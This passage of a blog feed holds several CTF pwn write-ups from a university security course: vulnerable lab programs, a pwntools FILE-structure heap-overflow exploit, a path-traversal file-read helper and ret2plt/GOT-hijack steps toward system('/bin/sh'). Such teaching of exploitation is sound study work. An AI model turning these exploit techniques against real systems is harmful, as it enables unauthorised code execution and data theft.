&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x22(Lab - `AAR`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/</guid><description>&lt;h1 id="simple-pwn-0x22lab---aar">
 Simple PWN 0x22(Lab - &lt;code>AAR&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn-0x22lab---aar">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

char flag[0x10] = &amp;#34;FLAG{TEST}\n&amp;#34;;

int main()
{
 FILE *fp;
 char *buf;

 buf = malloc(0x10);
 fp = fopen(&amp;#34;/tmp/meow&amp;#34;, &amp;#34;w&amp;#34;);
 read(0, buf, 0x1000);
 fwrite(buf, 0x10, 1, fp);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;h2 id="exploit---heap-overflow--overlap-flag">
 Exploit - heap overflow + overlap flag
 &lt;a class="anchor" href="#exploit---heap-overflow--overlap-flag">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from pwn import *

# r = process(&amp;#39;./chal&amp;#39;)
r = remote(&amp;#39;edu-ctf.zoolab.org&amp;#39;, 10010)

context.arch = &amp;#39;amd64&amp;#39;

flag_addr = 0x404050

raw_input()
payload = flat(
 p64(0)*4,
 p64(0xfbad0800), #_flags
 p64(0), #_IO_read_ptr
 p64(flag_addr), #_IO_read_end
 p64(0), #_IO_read_base
 p64(flag_addr), #_IO_write_base
 p64(flag_addr+0x10), #_IO_write_ptr
 p64(0)*8, #_IO_write_end + _IO_buf_base + _IO_buf_end + _chain
 p64(0x1) #_fileno
)

r.send(payload)

r.interactive()
&lt;/code>&lt;/pre></description></item><item><title>Simple PWN 0x23(Lab - `AAW`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/</guid><description>&lt;h1 id="simple-pwn-0x23lab---aaw">
 Simple PWN 0x23(Lab - &lt;code>AAW&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn-0x23lab---aaw">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

char flag[0x10] = &amp;#34;FLAG{TEST}\n&amp;#34;;
char owo[] = &amp;#34;OWO!&amp;#34;;

int main()
{
 FILE *fp;
 char *buf;

 buf = malloc(0x10);
 fp = fopen(&amp;#34;/tmp/meow&amp;#34;, &amp;#34;r&amp;#34;);
 read(0, buf, 0x1000);
 fread(buf, 0x10, 1, fp);

 if (strcmp(owo, &amp;#34;OWO!&amp;#34;) != 0)
 write(1, flag, sizeof(flag));

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x31(2023 HW - Notepad - Stage - 1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/</guid><description>&lt;h1 id="simple-pwn-0x312023-hw---notepad---stage---1">
 Simple PWN 0x31(2023 HW - Notepad - Stage - 1)
 &lt;a class="anchor" href="#simple-pwn-0x312023-hw---notepad---stage---1">#&lt;/a>
&lt;/h1>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>nc 10.113.184.121 10044&lt;/p>
&lt;p>You should solve the PoW to invoke a new instance.
You can use the pow_solver.py script in the released zip to solve the PoW.
After you solve the PoW, the service will create a new container and show &amp;gt;you the port. Connect it to play this challenge!
The container will be destroy at 5 minutes. So you should debug your exploit in your environment.&lt;/p></description></item><item><title>Simple PWN 0x32(2023 HW - Notepad-Stage 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/</guid><description>&lt;h1 id="simple-pwn-0x322023-hw---notepad-stage-2">
 Simple PWN 0x32(2023 HW - Notepad-Stage 2)
 &lt;a class="anchor" href="#simple-pwn-0x322023-hw---notepad-stage-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Try to get /flag_backend.&lt;/p>
&lt;p>Hint1: The only intended vulnerability in the frontend (notepad) is the path traversal.
Hint2: Try to write the shellcode into process memory by the path traversal vulnerability.&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>呈上題&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>:::success
Special Thanks @cs-otaku For the most of the Inspiration of the WP
:::&lt;/p>
&lt;ul>
&lt;li>Recap
在上一題，我們已經知道了他的前端漏洞為path traversal，換言之是不是可以做到任意讀取的功能，如下:
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">read_any_file&lt;/span>(file_name):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;../../../../../../&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> (&lt;span style="color:#ae81ff">89&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(file_name)) &lt;span style="color:#f92672">+&lt;/span> file_name
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(&lt;span style="color:#66d9ef">True&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ret &lt;span style="color:#f92672">=&lt;/span> dealing_cmd(r, &lt;span style="color:#ae81ff">5&lt;/span>, payload, offset&lt;span style="color:#f92672">=&lt;/span>str(offset)&lt;span style="color:#f92672">.&lt;/span>encode())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print(ret, len(ret))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ret &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Read note failed.&amp;#39;&lt;/span> &lt;span style="color:#f92672">and&lt;/span> ret &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Couldn&amp;#39;t open the file.&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res &lt;span style="color:#f92672">+=&lt;/span> ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> offset &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log&lt;span style="color:#f92672">.&lt;/span>success(res)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> res
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>==漏洞發想==
透過@cs-otaku的WP，了解到如果可以做到任意讀取有甚麼厲害的地方呢?那我們就可以想辦法用該題提供的write_note的功能以及lseek的功能，寫入==/proc/self/mem==這個檔案，這是甚麼東西呢?可以看一下&lt;a href="http://blog.coderhuo.tech/2017/10/12/Virtual_Memory_C_strings_proc/">虛擬內存探究 &amp;ndash; 第一篇:C strings &amp;amp; /proc&lt;/a>，要做的事情和我們的幾乎一樣，簡單說就是&lt;/p></description></item><item><title>Simple PWN 0x33(2023 Lab - ROP_RW)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/</guid><description>&lt;h1 id="simple-pwn-0x332023-lab---rop_rw">
 Simple PWN 0x33(2023 Lab - ROP_RW)
 &lt;a class="anchor" href="#simple-pwn-0x332023-lab---rop_rw">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>ROP chain&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> flag[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> secret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> empty_buf[&lt;span style="color:#ae81ff">0x30&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">check&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>input)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> pass[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> output[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)pass)[i] &lt;span style="color:#f92672">=&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)input)[i] &lt;span style="color:#f92672">^&lt;/span> secret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (strcmp(pass, &lt;span style="color:#e6db74">&amp;#34;kyoumokawaii&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)output)[i] &lt;span style="color:#f92672">=&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)flag)[i] &lt;span style="color:#f92672">^&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)pass)[i];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;flag = %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, output);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, _IONBF, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, _IONBF, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/home/chal/flag.txt&amp;#34;&lt;/span>, O_RDONLY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(fd, flag, &lt;span style="color:#ae81ff">0x10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	close(fd);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/dev/urandom&amp;#34;&lt;/span>, O_RDONLY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(fd, &lt;span style="color:#f92672">&amp;amp;&lt;/span>secret, &lt;span style="color:#66d9ef">sizeof&lt;/span>(secret));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)flag)[i] &lt;span style="color:#f92672">=&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)flag)[i] &lt;span style="color:#f92672">^&lt;/span> secret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;secret = %lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, secret);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	gets(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x34 (2023 Lab - ret2plt)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/</guid><description>&lt;h1 id="simple-pwn-0x34-2023-lab---ret2plt">
 Simple PWN 0x34 (2023 Lab - ret2plt)
 &lt;a class="anchor" href="#simple-pwn-0x34-2023-lab---ret2plt">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Got Hijack / BoF&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//gcc -no-pie -fno-stack-protector -z norelro ret2plt.c -o ret2plt
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Try your best :&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	gets(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;boom !&amp;#34;&lt;/span>);	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>checksec + file
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ checksec chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_ret2plt/share/chal&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Arch: amd64-64-little
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RELRO: No RELRO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Stack: No canary found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NX: NX enabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ file chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chal: ELF 64-bit LSB executable, x86-64, version &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>SYSV&lt;span style="color:#f92672">)&lt;/span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID&lt;span style="color:#f92672">[&lt;/span>sha1&lt;span style="color:#f92672">]=&lt;/span>f7ed984819a3908eff455bfcf87716d0fb298fac, &lt;span style="color:#66d9ef">for&lt;/span> GNU/Linux 3.2.0, not stripped
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先知道這隻binary是動態link library，所以可想而知，rop gadget一定少的可憐，所以我們不太能夠直接像上一題一樣暴力開一個shell出來，程式也沒有幫我們開，讓我們可以直接跳過去&lt;/li>
&lt;li>還是有很明顯的BOF的漏洞，此時就可以嘗試類似got hijack的方式打看看
流程:&lt;/li>
&lt;li>首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: ==ret2plt==
&lt;pre tabindex="0">&lt;code>pop rdi ret
puts got address
puts plt
&lt;/code>&lt;/pre>這三行的意思是把puts的got address，透過puts印出來給我們 -&amp;gt; puts(put自己的got address)&lt;/li>
&lt;li>有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># leak puts got address to calculate libc base address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_addr &lt;span style="color:#f92672">=&lt;/span> u64(r&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">6&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#f92672">=&lt;/span> puts_addr &lt;span style="color:#f92672">-&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">=&lt;/span> libc_base
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>system_addr &lt;span style="color:#f92672">=&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有&lt;code>/bin/sh&lt;/code>或是&lt;code>/sh&lt;/code>的string，不過我們可以直接用同樣的方法，把字串送進去
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># fetch user input -&amp;gt; /bin/sh\x00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_plt,
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>此時他就會像使用者要輸入，並把我們的輸入丟到bss address&lt;/li>
&lt;li>另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking==
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># fetch user input -&amp;gt; system address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_got
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_plt
